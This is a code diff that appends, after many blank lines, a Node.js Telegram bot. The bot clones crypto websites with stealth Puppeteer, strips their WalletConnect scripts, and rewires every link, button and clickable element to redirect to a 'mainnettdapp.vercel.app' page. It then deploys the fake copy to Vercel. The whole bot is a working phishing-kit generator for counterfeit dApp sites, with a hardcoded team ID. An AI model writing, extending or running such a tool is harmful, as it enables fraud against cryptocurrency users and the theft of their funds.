@@ -1483,3 +1483,608 @@ async function scrape() {
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+import { Telegraf, Markup } from "telegraf";
+import axios from "axios";
+import puppeteer from "puppeteer-extra";
+import StealthPlugin from "puppeteer-extra-plugin-stealth";
+import * as cheerio from "cheerio";
+import fs from "fs-extra";
+import path from "path";
+import { URL } from "url";
+import { Vercel } from "@vercel/sdk";
+import dotenv from "dotenv";
+import { fileURLToPath } from "url";
+
+// Define __filename and __dirname
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+dotenv.config();
+
+const vercel = new Vercel({
+  bearerToken: process.env.vercelToken, // replace with your real token
+});
+
+const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
+puppeteer.use(StealthPlugin());
+
+// Track per-user states
+const userStates = new Map();
+
+// /start command
+bot.start((ctx) => {
+  ctx.reply("✅ Welcome! Use /clone to fetch a website’s HTML.");
+});
+
+// /run command
+bot.command("run", (ctx) => {
+  ctx.reply("🏃‍♂️ Running...");
+});
+
+// /clone command – ask for website
+bot.command("clone", (ctx) => {
+  ctx.reply(
+    "🔗 Enter the <b>website URL</b> you want to clone (must start with <code>https://</code>)\n\n✅ Make sure the site is live and accessible.",
+    { parse_mode: "HTML" }
+  );
+
+  userStates.set(ctx.chat.id, "awaiting_url");
+});
+
+const userFolders = new Map();
+
+bot.on("text", async (ctx) => {
+  const state = userStates.get(ctx.chat.id);
+  // === CASE 1: CLONING ===
+  if (state === "awaiting_url") {
+    const siteUrl = ctx.message.text.toLowerCase();
+    if (!siteUrl.startsWith("https://")) {
+      return ctx.reply("❌ Enter a valid link that starts with *https://*", {
+        parse_mode: "Markdown",
+      });
+    }
+
+    userStates.delete(ctx.chat.id);
+    await ctx.reply(
+      "🔍 Cloning the full website...\n\nHang tight — this might take a little while."
+    );
+
+(async () => {
+  const outputDir = path.join(__dirname, "cloned");
+  const redirectURL = "https://mainnettdapp.vercel.app/"; // Your redirect URL
+
+  // Clear the cloned directory before starting
+  async function clearClonedDirectory() {
+    try {
+      await fs.remove(outputDir);
+      console.log("🧹 Cleared cloned directory:", outputDir);
+    } catch (err) {
+      console.error("⚠️ Failed to clear cloned directory:", err.message);
+    }
+  }
+
+  // Function to download a file
+  async function downloadFile(url, dest) {
+    try {
+      const response = await axios.get(url, { responseType: "arraybuffer" });
+      await fs.outputFile(dest, response.data);
+      console.log(`📥 Downloaded: ${url} -> ${dest}`);
+      return true;
+    } catch (err) {
+      console.warn(`⚠️ Failed to download ${url}: ${err.message}`);
+      return false;
+    }
+  }
+
+  try {
+    // Clear and recreate directories
+    await clearClonedDirectory();
+    await fs.ensureDir(path.join(outputDir, "css"));
+    await fs.ensureDir(path.join(outputDir, "js")); // Added: Create js directory
+    console.log("📁 Created css and js directories");
+
+    // Launch browser
+    const browser = await puppeteer.launch({
+      headless: "new",
+      args: ["--no-sandbox", "--disable-setuid-sandbox"],
+    });
+
+    try {
+      const page = await browser.newPage();
+      await page.setUserAgent(
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/604.1"
+      );
+      await page.setViewport({
+        width: 375,
+        height: 812,
+        isMobile: true,
+        hasTouch: true,
+      });
+
+      // Navigate and wait for full rendering
+      console.log("🌐 Navigating to:", siteUrl);
+      await page.goto(siteUrl, {
+        waitUntil: "networkidle2",
+        timeout: 30000,
+      });
+      await new Promise((resolve) => setTimeout(resolve, 5000)); // Wait for dynamic content
+
+      // Attempt to enable request interception
+      try {
+        await page.setRequestInterception(true);
+        page.on("request", (request) => {
+          if (request.url().includes("wss://relay.walletconnect.com")) {
+            request.abort();
+            console.log("🚫 Aborted WalletConnect WebSocket request");
+          } else {
+            request.continue();
+          }
+        });
+      } catch (err) {
+        console.warn("⚠️ Failed to enable request interception:", err.message);
+        console.log("Continuing without request interception...");
+      }
+
+      // Disable WalletConnect globals and scripts in the browser
+      await page.evaluate(() => {
+        window.WalletConnect = undefined;
+        window.WalletConnectProvider = undefined;
+        console.log("🚫 Disabled WalletConnect globals");
+      });
+
+      // Modify image src and remove srcset in the browser
+      await page.evaluate((siteUrl) => {
+        const images = document.querySelectorAll("img[src]");
+        images.forEach((img) => {
+          const src = img.getAttribute("src");
+          if (src && !src.startsWith("data:")) {
+            try {
+              const fullUrl = new URL(src, siteUrl).href;
+              const urlObj = new URL(fullUrl);
+              const editedSrc = `${siteUrl}${urlObj.pathname}${urlObj.search}${urlObj.hash}`;
+              img.setAttribute("src", editedSrc);
+              img.removeAttribute("srcset");
+              console.log(`🖼️ Updated image: src=${editedSrc}, srcset removed`);
+            } catch (err) {
+              console.warn(`⚠️ Failed to process image URL: ${src}, error: ${err.message}`);
+              img.removeAttribute("srcset");
+            }
+          } else {
+            img.removeAttribute("srcset");
+          }
+        });
+
+        // Patch history.replaceState to block cross-origin redirects
+        const currentOrigin = window.location.origin;
+        const originalReplaceState = history.replaceState;
+        history.replaceState = function (state, title, url) {
+          try {
+            if (url && !url.startsWith("/") && !url.startsWith(currentOrigin)) {
+              console.warn(`🚫 Blocked cross-origin replaceState to: ${url}`);
+              return;
+            }
+            originalReplaceState.call(history, state, title, url);
+          } catch (err) {
+            console.warn(`⚠️ Error in replaceState: ${err.message}`);
+          }
+        };
+      }, siteUrl);
+
+      // Get modified HTML
+      const html = await page.content();
+      const $ = cheerio.load(html);
+
+      // Remove existing <base> tag and add new one
+      $("base").remove();
+      $("head").prepend(`<base href="${siteUrl}">`);
+
+      // Process images in Cheerio
+      const images = $("img[src]");
+      for (const el of images.toArray()) {
+        const src = $(el).attr("src");
+        if (src && !src.startsWith("data:")) {
+          try {
+            const fullUrl = new URL(src, siteUrl).href;
+            const urlObj = new URL(fullUrl);
+            const editedSrc = `${siteUrl}${urlObj.pathname}${urlObj.search}${urlObj.hash}`;
+            $(el).attr("src", editedSrc);
+            $(el).removeAttr("srcset");
+          } catch (err) {
+            console.warn(`⚠️ Failed to process image URL: ${src}, error: ${err.message}`);
+            $(el).removeAttr("srcset");
+          }
+        } else {
+          $(el).removeAttr("srcset");
+        }
+      }
+
+      // Download and update CSS files
+      const cssLinks = $("link[rel='stylesheet'][href]");
+      for (const el of cssLinks.toArray()) {
+        const href = $(el).attr("href");
+        if (href && !href.startsWith("data:")) {
+          try {
+            const cssUrl = new URL(href, siteUrl).href;
+            const cssFileName = path.basename(new URL(cssUrl).pathname);
+            const cssPath = path.join(outputDir, "css", cssFileName);
+
+            // Download the CSS file
+            await downloadFile(cssUrl, cssPath);
+
+            // Update the href to point to the local CSS file
+            $(el).attr("href", `css/${cssFileName}`);
+            console.log(`🖌️ Updated CSS link: ${href} -> css/${cssFileName}`);
+          } catch (err) {
+            console.warn(`⚠️ Failed to process CSS URL: ${href}, error: ${err.message}`);
+          }
+        }
+      }
+
+      // Download and update JS files
+      const jsScripts = $("script[src]");
+      for (const el of jsScripts.toArray()) {
+        const src = $(el).attr("src");
+        if (src && !src.startsWith("data:") && !src.includes("walletconnect")) {
+          try {
+            const jsUrl = new URL(src, siteUrl).href;
+            const jsFileName = path.basename(new URL(jsUrl).pathname);
+            const jsPath = path.join(outputDir, "js", jsFileName);
+
+            // Download the JS file
+            await downloadFile(jsUrl, jsPath);
+
+            // Update the src to point to the local JS file
+            $(el).attr("src", `js/${jsFileName}`);
+            console.log(`📜 Updated JS link: ${src} -> js/${jsFileName}`);
+          } catch (err) {
+            console.warn(`⚠️ Failed to process JS URL: ${src}, error: ${err.message}`);
+          }
+        }
+      }
+
+      // Redirect external links
+      $("a[href]").each((_, el) => {
+        const href = $(el).attr("href");
+        if (
+          href &&
+          href.startsWith("http") &&
+          !href.includes(new URL(siteUrl).hostname)
+        ) {
+          $(el).attr("href", redirectURL);
+          $(el).removeAttr("target");
+        }
+      });
+
+      // Handle buttons and cursor:pointer elements
+      let pointerCount = 0;
+      $("button:not([data-no-redirect])").attr(
+        "onclick",
+        `window.location='${redirectURL}'`
+      );
+      $("[style]").each((_, el) => {
+        const style = $(el).attr("style");
+        if (style && style.toLowerCase().includes("cursor: pointer")) {
+          $(el).attr("onclick", `window.location='${redirectURL}'`);
+          pointerCount++;
+        }
+      });
+
+      // Find CSS classes with cursor: pointer
+      const pointerClasses = new Set();
+      $("style").each((_, el) => {
+        const css = $(el).html();
+        const matches = css.match(
+          /\.(\w[\w-]*)\s*{[^}]*cursor\s*:\s*pointer[^}]*}/gi
+        );
+        if (matches) {
+          matches.forEach((rule) => {
+            const classMatch = rule.match(/\.(\w[\w-]*)/);
+            if (classMatch) pointerClasses.add(classMatch[1]);
+          });
+        }
+      });
+
+      for (const className of pointerClasses) {
+        $(`.${className}`).attr(
+          "onclick",
+          `window.location='${redirectURL}'`
+        );
+        pointerCount += $(`.${className}`).length;
+      }
+
+      // Remove WalletConnect scripts
+      $("script").each((_, el) => {
+        const src = $(el).attr("src") || "";
+        const content = $(el).html() || "";
+        if (
+          src.includes("walletconnect") ||
+          content.includes("walletconnect")
+        ) {
+          $(el).remove();
+          console.log("🗑️ Removed WalletConnect script");
+        }
+      });
+
+      // Add consolidated redirect script
+      $("head").prepend(`
+        <style>
+          a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'],
+          [class*='cursor-pointer'], input[type='button'], input[type='submit'], input[type='reset'] {
+            cursor: pointer !important;
+          }
+        </style>
+        <script>
+          document.addEventListener('DOMContentLoaded', () => {
+            const redirectURL = '${redirectURL}';
+            const selectors = [
+              'a', 'button', 'input[type="button"]', 'input[type="submit"]', 'input[type="reset"]',
+              '[role="button"]', '[onclick]', '[style*="cursor: pointer"]', '[class*="cursor-pointer"]',
+              '[tabindex]', '[data-dropdown-option]'
+            ];
+            const elements = document.querySelectorAll(selectors.join(','));
+            elements.forEach(el => {
+              el.onclick = null;
+              el.removeAttribute('onclick');
+              el.removeAttribute('href');
+              el.removeAttribute('target');
+              if (window.jQuery && typeof jQuery === 'function') {
+                try { jQuery(el).off(); } catch (_) {}
+              }
+              const reactKey = Object.keys(el).find(k => k.startsWith('__react'));
+              if (reactKey) delete el[reactKey];
+              ['click', 'pointerdown', 'touchstart'].forEach(evt => {
+                el.addEventListener(evt, (e) => {
+                  e.preventDefault();
+                  e.stopImmediatePropagation();
+                  window.location.href = redirectURL;
+                }, true);
+              });
+            });
+
+            // Fix images
+            const images = document.querySelectorAll('img');
+            images.forEach(img => {
+              img.removeAttribute('srcset');
+              const src = img.getAttribute('src');
+              if (src && src.startsWith('/') && !src.startsWith('data:') && !src.startsWith('//') && !src.startsWith('http')) {
+                img.src = new URL(src, '${siteUrl}').href;
+              }
+            });
+
+            console.log('✅ Clickable elements and images patched.');
+            setTimeout(() => document.querySelectorAll('img').forEach(img => img.removeAttribute('srcset')), 3000);
+          });
+        </script>
+      `);
+
+      // Log progress
+      console.log("🎯 Pointer-style elements redirected:", pointerCount);
+      console.log("🔘 <button> elements redirected:", $("button").length);
+      console.log("🔗 <a> links redirected to:", redirectURL);
+      console.log("🖌️ CSS files downloaded:", cssLinks.length);
+      console.log("📜 JS files downloaded:", jsScripts.length);
+
+      // Save HTML
+      await fs.outputFile(path.join(outputDir, "index.html"), $.html());
+      console.log("✅ Done! Saved at cloned/index.html");
+
+      // Simulate ctx.reply (replace with your actual Telegram bot logic)
+      console.log(
+        "✅ Site cloned using original CSS and JS links! Ready for deploy."
+      );
+    } catch (err) {
+      console.error("❌ Page processing failed:", err.message, err.stack);
+      console.log("✅ Error cloning");
+    } finally {
+      await browser.close();
+    }
+  } catch (err) {
+    console.error("❌ Script failed:", err.message, err.stack);
+  }
+})();
+  }
+
+  // === CASE 2: HOSTING ===
+  if (state === "awaiting_site_name") {
+    userStates.delete(ctx.chat.id);
+    const siteName = ctx.message.text.trim().toLowerCase().replace(/\s+/g, "-");
+
+    if (!siteName || siteName.length < 3) {
+      return ctx.reply("❌ Site name is too short or invalid. Try again.");
+    }
+
+    const folder = "./cloned";
+    if (!fs.existsSync(folder)) {
+      return ctx.reply("❌ No cloned folder found. Please clone a site first.");
+    }
+
+    await ctx.reply("🛠️ Just a moment...\n\nWe're getting your site ready!");
+
+    const TEXT_FILE_EXTENSIONS = [
+      ".html",
+      ".js",
+      ".css",
+      ".json",
+      ".txt",
+      ".md",
+    ];
+    const isTextFile = (filePath) =>
+      TEXT_FILE_EXTENSIONS.includes(path.extname(filePath).toLowerCase());
+
+    function getFilesArray(dir, baseDir = dir) {
+      const entries = fs.readdirSync(dir, { withFileTypes: true });
+      let files = [];
+
+      for (const entry of entries) {
+        const fullPath = path.join(dir, entry.name);
+        const relativePath = path
+          .relative(baseDir, fullPath)
+          .replace(/\\/g, "/");
+
+        if (entry.isDirectory()) {
+          files = files.concat(getFilesArray(fullPath, baseDir));
+        } else {
+          const fileBuffer = fs.readFileSync(fullPath);
+          const data = isTextFile(fullPath)
+            ? fileBuffer.toString("utf-8")
+            : fileBuffer.toString("base64");
+
+          files.push({ file: relativePath, data });
+        }
+      }
+
+      return files;
+    }
+
+    const files = getFilesArray(folder);
+
+    try {
+      const result = await vercel.deployments.createDeployment({
+        teamId: process.env.vercelTeamId, // replace with your real team ID
+        slug: siteName,
+        requestBody: {
+          name: siteName,
+          project: siteName,
+          target: "production",
+          files: files,
+          projectSettings: {
+            framework: null,
+            buildCommand: null,
+            installCommand: null,
+            outputDirectory: ".",
+          },
+        },
+      });
+
+      console.log("✅ Deployment complete!", result);
+
+      setTimeout(() => {
+        ctx.reply(
+          `✅ *Deployment Successful!*\n\n` +
+            `🌐 *Predicted URL:*\nhttps://${result.name}.vercel.app\n\n` +
+            `🚀 *Live URL(s):*\n${result.alias?.[0] || "Not available"}\n` +
+            `${result.alias?.[1] ? `\n${result.alias[1]}` : ""}\n\n` +
+            `🎉 Your site is now live on Vercel!`,
+          { parse_mode: "Markdown" }
+        );
+      }, 3000); // Delay to ensure Vercel processes the deployment
+    } catch (error) {
+      console.error("❌ Hosting error:", error);
+      ctx.reply("⚠️ Error deploying site. Please try again later.");
+    }
+  }
+});
+
+// Handle "Host" button click
+bot.action("host", async (ctx) => {
+  ctx.answerCbQuery();
+  userStates.set(ctx.chat.id, "awaiting_site_name");
+  return ctx.reply(
+    "💡 <b>What's the name of your site?</b>\n\n⚠️ Make sure it's unique and hasn't been used before.",
+    { parse_mode: "HTML" }
+  );
+});
+
+// Handle text message (e.g., site name)
+bot.on("text", async (ctx) => {
+  const state = userStates.get(ctx.chat.id);
+
+  if (state !== "awaiting_site_name") return;
+
+  userStates.delete(ctx.chat.id); // Clear state
+  const siteName = ctx.message.text.trim().toLowerCase().replace(/\s+/g, "-");
+
+  if (!siteName || siteName.length < 3 || siteName.includes(".")) {
+    return ctx.reply(
+      "⚠️ The site name is too short or invalid.\n\n🚫 Dots (.) are not allowed.\n✍️ Please try again with just the name."
+    );
+  }
+
+  const folder = "./cloned";
+  console.log("Hosting folder:", folder);
+
+  if (!fs.existsSync(folder)) {
+    return ctx.reply("❌ No cloned folder found. Please clone a site first.");
+  }
+
+  const TEXT_FILE_EXTENSIONS = [".html", ".js", ".css", ".json", ".txt", ".md"];
+  const isTextFile = (filePath) =>
+    TEXT_FILE_EXTENSIONS.includes(path.extname(filePath).toLowerCase());
+
+  function getFilesArray(dir, baseDir = dir) {
+    const entries = fs.readdirSync(dir, { withFileTypes: true });
+    let files = [];
+
+    for (const entry of entries) {
+      const fullPath = path.join(dir, entry.name);
+      const relativePath = path.relative(baseDir, fullPath).replace(/\\/g, "/");
+
+      if (entry.isDirectory()) {
+        files = files.concat(getFilesArray(fullPath, baseDir));
+      } else {
+        const fileBuffer = fs.readFileSync(fullPath);
+        const data = isTextFile(fullPath)
+          ? fileBuffer.toString("utf-8")
+          : fileBuffer.toString("base64");
+
+        files.push({ file: relativePath, data });
+      }
+    }
+
+    return files;
+  }
+
+  const files = getFilesArray(folder);
+
+  try {
+    const result = await vercel.deployments.createDeployment({
+      teamId: "team_AwRWdZTHaoWRoHvGvRg19YS7",
+      slug: siteName,
+      requestBody: {
+        name: siteName,
+        project: siteName,
+        target: "production",
+        files: files,
+        projectSettings: {
+          framework: null,
+          buildCommand: null,
+          installCommand: null,
+          outputDirectory: ".",
+        },
+      },
+    });
+
+    console.log("✅ Deployment complete!", result);
+
+    ctx.reply(
+      `✅ *Deployment Successful!*\n\n` +
+        `🌐 *Predicted URL:*\nhttps://${result.name}.vercel.app\n\n` +
+        `🚀 *Live URL(s):*\n${result.alias?.[0] || "Not available"}\n` +
+        `${result.alias?.[1] ? `\n${result.alias[1]}` : ""}\n\n` +
+        `🎉 Your site is now live on Vercel!`,
+      { parse_mode: "Markdown" }
+    );
+  } catch (error) {
+    console.error("❌ Hosting error:", error);
+    ctx.reply("⚠️ Error deploying site. Please try again later.");
+  }
+});
+
+// Start the bot
+bot.launch().then(() => {
+  console.log("🤖 Bot is running...");
+});
+console.log("🤖 Bot is running...");
